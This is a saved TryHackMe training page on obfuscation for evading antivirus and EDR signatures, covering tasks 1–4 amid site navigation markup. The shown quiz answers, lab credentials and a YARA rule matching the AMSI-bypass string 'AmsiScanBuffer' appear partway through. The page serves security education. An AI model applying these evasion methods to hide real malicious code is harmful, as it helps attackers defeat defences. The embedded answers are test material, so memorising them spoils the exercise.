<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Obfuscation Principles_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div class="modal-body">
<figure>
<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Obfuscation Principles_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Obfuscation Principles_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Obfuscation Principles_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/obfuscationprinciples#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Obfuscation Principles_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Obfuscation Principles_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Obfuscation Principles_files/notifications.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Obfuscation Principles_files/461db271e310812a73d4a96abd2dc9eb.png">
<div>
<div id="room-details">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">188</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Obfuscation Principles_files/7ec073c23670722c04caa1056194f8aa.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Obfuscation Principles</h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/obfuscationprinciples#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/obfuscationprinciples#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/obfuscationprinciples" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Obfuscation Principles_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">Leverage tool-agnostic software obfuscation practices to hide malicious functions and create unique code.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/obfuscationprinciples#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/obfuscationprinciples#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/obfuscationprinciples#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/obfuscationprinciples#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/obfuscationprinciples#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-medium">Medium</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/630e310c8d6b160055e6e084">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 5349 users are in here and this room is 321 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Obfuscation Principles_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Obfuscation Principles_files/9e946af210ae86d6fbfda480d958b3fe.gif"> 
        <a class="green-link" href="https://tryhackme.com/p/Cryillic">Cryillic</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3" id="table-machine-ip">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-success" role="progressbar" style="width: 100%; aria-valuemin=" 0"="" aria-valuemax="100"> 100%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Obfuscation is an essential component of detection evasion methodology and preventing analysis of malicious software. Obfuscation originated to protect software and intellectual property from being stolen or reproduced. While it is still widely used for its original purpose, adversaries have adapted its use for malicious intent.</p><p>
</p><p>In this room, we will observe obfuscation from multiple perspectives and break down obfuscation methods.</p>
<div>
<img src="./TryHackMe _ Obfuscation Principles_files/ab3d8ccd4dcf26c86b2eb53e676b619f.png" alt="decorative image of an eye" style="float:right;width:210px;height:127.826px" class="note-float-right">
<h3>Learning Objectives</h3>
<ol>
<li>Learn how to evade modern detection engineering using tool-agnostic obfuscation</li>
<li>Understand the principles of obfuscation and its origins from intellectual property protection</li>
<li>Implement obfuscation methods to hide malicious functions</li>
</ol>

<p><span>Before beginning this room, familiarize yourself with basic programming logic and syntax. Knowledge of C and <a class="XuhyELFy glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;XuhyELFy&#39;)">PowerShell</a> is recommended but not required.</span></p><p><span>We have provided several machines with the required files and web servers to complete this room. Using the credentials below, you can access the machine and web server in-browser or through <a class="9sSwzGsK glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;9sSwzGsK&#39;)">RDP</a>.</span></p><p style="text-align:center">Machine IP:&nbsp;<code style="font-size:14px">MACHINE_IP</code>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username:&nbsp;<code style="font-size:14px">Student</code>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password:&nbsp;<code style="font-size:14px">TryHackMe!</code><br></p><p>
</p><p><span style="font-size:1rem">This is going to be a lot of information. Please put on your evil helmets and locate your nearest fire extinguisher.</span><br></p></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and continue to the next task.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Origins of Obfuscation
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Obfuscation is widely used in many software-related fields to protect <strong>IP</strong> (<strong>I</strong>ntellectual <strong>P</strong>roperty) and other proprietary information an application may contain.</p><p>For example, the popular game: Minecraft uses the obfuscator&nbsp;<a href="https://github.com/Guardsquare/proguard">ProGuard</a> to obfuscate and minimize its Java classes. Minecraft also releases&nbsp;<strong>obfuscation maps</strong> with limited information as a translator between the old un-obfuscated classes and the new obfuscated classes to support the modding community.</p><p>

</p><p>This is only one example of the wide range of ways obfuscation is publicly used. To document and organize the variety of obfuscation methods, we can reference the <a href="https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf">Layered obfuscation: a taxonomy of software obfuscation techniques for layered security paper</a>. This research paper organizes obfuscation methods by <strong>layers</strong>, similar to the OSI model but for application data flow. Below is the figure used as the complete overview of each taxonomy layer.</p><p style="text-align:center">

<img src="./TryHackMe _ Obfuscation Principles_files/54c0a2415cd4fc88a55b154bf297910c.png" alt="Diagram showing the four layers of the layered obfuscation taxonomy: Code-Element Layer, Software-Component Layer, Inter-Component Layer, and Application layer" style="width:733px;height:474.856px"><br></p><p>Each sub-layer is then broken down into specific methods that can achieve the overall objective of the sub-layer.</p><p>
</p><p>In this room, we will primarily focus on the <strong>code-element layer</strong> of the taxonomy, as seen in the figure below.</p><p style="text-align:center"><img src="./TryHackMe _ Obfuscation Principles_files/974cf87ce312e0885e6e8027f9c1821e.png" alt="Diagram showing sub-layers of the Code-Element Layer: Obfuscating Layout, Obfuscating Controls, Obfuscating Data, Obfuscating Methods, and Obfuscating Classes" style="width:844px;height:552.305px"><br></p><p>To use the taxonomy, we can determine an objective and then pick a method that fits our requirements. For example, suppose we want to obfuscate the layout of our code but cannot modify the existing code. In that case, we can inject junk code, summarized by the taxonomy:</p><p style="text-align:center"> <code>Code Element Layer</code> &gt; <code>Obfuscating Layout</code> &gt; <code>Junk Codes</code>.</p><p>
</p><p>But how could this be used maliciously? Adversaries and malware developers can leverage obfuscation to break signatures or prevent program analysis. In the upcoming tasks, we will discuss both perspectives of malware obfuscation, including the purpose and underlying techniques of each.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                How many core layers make up the Layered Obfuscation Taxonomy?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="4" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What sub-layer of the Layered Obfuscation Taxonomy encompasses meaningless identifiers?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *********** ******" value="Obfuscating Layout" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Obfuscation's Function for Static Evasion
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Two of the more considerable security boundaries in the way of an adversary are <strong>anti-virus engines</strong> and <strong><span><a class="a5ld9w2d glossary-term" onclick="initPopOver(&#39;EDR&#39;, &#39;a5ld9w2d&#39;)">EDR</a></span></strong> (<strong>E</strong>ndpoint <strong>D</strong>etection &amp; <strong>R</strong>esponse) solutions. As covered in the <a href="https://tryhackme.com/room/introtoav">Introduction to Anti-virus room</a>, both platforms will leverage an extensive database of known signatures referred to as <strong>static</strong> signatures as well as <strong>heuristic</strong> signatures that consider application behavior.</p><p>
</p><p>To evade signatures, adversaries can leverage an extensive range of logic and syntax rules to implement obfuscation. This is commonly achieved by abusing data obfuscation practices that hide important identifiable information in legitimate applications.</p><p>The aforementioned white paper: <a href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">Layered Obfuscation Taxonomy</a>, summarizes these practices well under the <strong>code-element </strong>layer. Below is a table of methods covered by the taxonomy in the <strong>obfuscating data </strong>sub-layer<strong>.</strong></p><p style="text-align:center"><img src="./TryHackMe _ Obfuscation Principles_files/dacc392986614d70d6dc982111077063.png" alt="Diagram showing the objectives of the Obfuscating Data Sub-Layer: Array Transformation, Data Encoding, Data Procedurization, and Data Splitting/Merging"><strong><br></strong></p>
<table class="table table-bordered"><tbody><tr><td><b>Obfuscation Method</b></td><td><b>Purpose</b><br></td></tr><tr><td>Array Transformation<br></td><td>Transforms an array by splitting, merging, folding, and flattening<br></td></tr><tr><td>Data Encoding<br></td><td>Encodes data with mathematical functions or ciphers<br></td></tr><tr><td>Data Procedurization<br></td><td>Substitutes static data with procedure calls<br></td></tr><tr><td>Data Splitting/Merging<br></td><td>Distributes information of one variable into several new variables<br></td></tr></tbody></table><p>In the upcoming tasks, we will primarily focus on <strong>data splitting/merging</strong>; because static signatures are weaker, we generally only need to focus on that one aspect in initial obfuscation.</p><p>
</p><p>Check out the Encoding/Packing/Binder/Crypters room for more information about <strong>data encoding,</strong> and the <a href="https://tryhackme.com/room/signatureevasion">Signature Evasion room</a> for more information about <strong>data procedurization</strong> and <strong>transformation</strong>.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What obfuscation method will break or split an object?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **** *********" value="Data Splitting" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What obfuscation method is used to rewrite static data with a procedure call?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **** ***************" value="Data Procedurization" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 4                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Object Concatenation
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="62decf9f393048004a3f8346" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p><strong>Concatenation</strong> is a common programming concept that combines two separate objects into one object, such as a string.</p>
<p>A pre-defined operator defines where the concatenation will occur to combine two independent objects. Below is a generic example of string concatenation in Python.</p>
<pre class=" language-python" tabindex="0"><code class=" language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> A <span class="token operator">=</span> <span class="token string">"Hello "</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> B <span class="token operator">=</span> <span class="token string">"THM"</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> C <span class="token operator">=</span> A <span class="token operator">+</span> B
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span>
Hello THM
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>
</code></pre>
<p>Depending on the language used in a program, there may be different or multiple pre-defined operators than can be used for concatenation. Below is a small table of common languages and their corresponding pre-defined operators.</p><table class="table table-bordered"><tbody><tr><td><b>Language<br></b></td><td><b>Concatenation Operator</b><br></td></tr><tr><td>Python<br></td><td>“<b>+</b>”<br></td></tr><tr><td><span><a class="6hdFsZ4L glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;6hdFsZ4L&#39;)">PowerShell</a></span><br></td><td>“<b>+</b>”, ”<b>,</b>”, ”<b>$</b>”, or no operator at all<br></td></tr><tr><td>C#<br></td><td>“<b>+</b>”, “<b>String.Join</b>”, “<b>String.Concat</b>”<br></td></tr><tr><td>C<br></td><td>“<b>strcat</b>”<br></td></tr><tr><td>C++<br></td><td>“<b>+</b>”, “<b>append</b>”<br></td></tr></tbody></table><p>The aforementioned white paper: <a href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">Layered Obfuscation Taxonomy</a>, summarizes these practices well under the <strong>code-element</strong> layer’s <strong>data splitting/merging</strong> sub-layer.</p><hr><p>What does this mean for attackers? Concatenation can open the doors to several vectors to modify signatures or manipulate other aspects of an application. The most common example of concatenation being used in malware is breaking targeted&nbsp;<strong>static signatures</strong>, as covered in the&nbsp;<a href="https://tryhackme.com/room/signatureevasion">Signature Evasion room</a>. Attackers can also use it preemptively to break up all objects of a program and attempt to remove all signatures at once without hunting them down, commonly seen in obfuscators as covered in task 9.</p><p>Below we will observe a static&nbsp;<strong>Yara</strong>&nbsp;rule and attempt to use concatenation to evade the static signature.</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell">rule ExampleRule
<span class="token punctuation">{</span>
    strings:
        <span class="token variable">$text_string</span> = <span class="token string">"AmsiScanBuffer"</span>
        <span class="token variable">$hex_string</span> = <span class="token punctuation">{</span> B8 57 00 07 80 C3 <span class="token punctuation">}</span>

    condition:
        <span class="token variable">$my_text_string</span> or <span class="token variable">$my_hex_string</span>
<span class="token punctuation">}</span>
